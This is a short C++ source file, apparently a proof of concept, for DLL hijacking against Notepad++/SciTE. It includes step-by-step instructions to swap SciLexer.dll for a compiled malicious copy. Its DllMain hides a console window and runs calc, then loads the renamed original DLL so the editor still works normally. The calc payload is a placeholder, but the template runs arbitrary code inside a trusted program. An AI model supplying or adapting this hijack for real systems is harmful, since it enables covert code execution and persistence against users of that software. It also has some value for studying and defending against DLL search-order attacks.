/* SciLexer.cpp 
Notepad++ (SciTE) DLL Hijack
Author: Miksha
Source of inspiration: https://t.co/j8CwdxNi8z
Description:
1. Replacement original SciLexer.dll on SciLexer_back.dll
2. Insert compiled SciLexer.dll
2. Run SciTE.exe

Сompilation:
1. install tdm-gcc https://t.co/XUoI3xpfkb 
2. [Win]+[R] -> cmd -> [Enter]
2. >cd C:\TDM-GCC-64
3. >mingwvars.bat
4. >cd C:\SciLexer
5. mingw32-make && mingw32-make clean
*/

#include <windows.h>


#define DLLEXPORT extern "C" __declspec(dllexport)

DLLEXPORT void calc (void);
bool is_running;  // once 

 bool APIENTRY DllMain(HANDLE hModule, DWORD dwReason, LPVOID lpReserved)
 {
 	if( !is_running ){

	is_running = true; 
    calc();                           //Start calculator


    HANDLE hmod;
    hmod = LoadLibrary("SciLexer_back.dll");
  }
 	return TRUE;
 }
 	
 
 
DLLEXPORT void calc(void)
{ 
  HWND Hide;
  AllocConsole();
  Hide = FindWindowA("ConsoleWindowClass", NULL);
  ShowWindow(Hide,0);
  system("calc");	 
  
 }
 
 

 